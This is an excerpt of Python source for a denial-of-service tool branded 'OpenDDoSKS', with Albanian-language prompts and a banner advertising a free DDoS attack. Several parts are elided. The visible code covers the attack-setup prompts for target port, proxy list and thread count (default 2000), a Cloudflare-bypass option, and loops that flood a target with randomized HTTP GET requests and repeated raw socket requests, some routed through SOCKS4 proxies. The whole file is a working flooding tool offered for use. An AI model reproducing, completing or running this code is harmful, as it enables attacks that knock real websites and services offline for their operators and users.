...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Contact: fb.com/trimykh ~ OpenDdosKosova v2.8")
    print('''
             - fb.com/trimykh -

    /\_____/\                                  _     _             
   /  o   o  \                                | |   | |           |  /   
  ( ==  ^  == )      ___  _ __   ___ _ __   __| | __| | ___  ___  | /   ___    ___   ___          ___
   )         (      / _ \| '_ \ / _ \ '_ \ / _` |/ _` |/ _ \/ __| |/   /   \  / __| /   \ \    / / _ | 
  (            )   | (_) | |_) |  __/ | | | (_| | (_| | (_) \__ \ |\    (_)   \__ \  (_)   \  /   (_)|
                    \___/| .__/ \___|_| |_|\__,_|\__,_|\___/|___/ | \  \___/  |___/ \___/   \/       |
========================================================
       OpenDDoSKS - Best Ddos attack For FREE edited By Trimy
 ===== Verzioni: [ Deluxe ]''')
    try:
        ...
        pass
    try:
        print("[*] Methoda DDos : " +str(name_method_attack))
    except:
        pass
    try:
        print("[*] Moda   : " +str(filenam2))
    except:
        pass
    try:
        print("[*] Bypassi : v" +str(method_pass_cf))
        
    except:
        pass
    try:
        print("[*] Proxat: %s" %(len(open(out_file).readlines())))
    except:
        pass
    try:
        print("[*] Threadsat: " +str(threads))
    except:
        pass
...
def start_port():
    global port
    print("-----------------------------")
    port = str(input("[*] Porti [80]: "))
    if port == '':
        if "https" in url:
                port = int(443)
                print("[!] Porti Selektuar = 443 [!]")
        else:
            port = int(80)
            print("[!] Porti Selektuar= 80 [!]")
    else:
        port = int(port)
...
def proxyget():
    ...
    f.close() 
    proxies = open(out_file).readlines()
    #print("[!] Merr Proxa Falas ( Live 100% ) [" +out_file+ "] = [ " +str(len(open(out_file).readlines()))+ " ]")
    logo()
    numthreads()
...
def numthreads():
    ...
    try:
        print("-----------------------------")
        threads = int(input("[*] Threadsat (nolimit) [2000]: "))
    except ValueError:
        threads = int(2000)
        print ("[!] Threadsat e Selektum " +str(threads)+ " [!]\n")
    logo()
    begin()

def begin():
    choice6 = input('=*= Shtyp "Enter" Per me fillu sulmi: ')
    if choice6 == "":
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] fb.com/trimykh | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
            ...
            try:
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] fb.com/trimykh | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] fb.com/trimykh | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] fb.com/trimykh | Sent [" +str(req_code)+ "] | Error - at [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
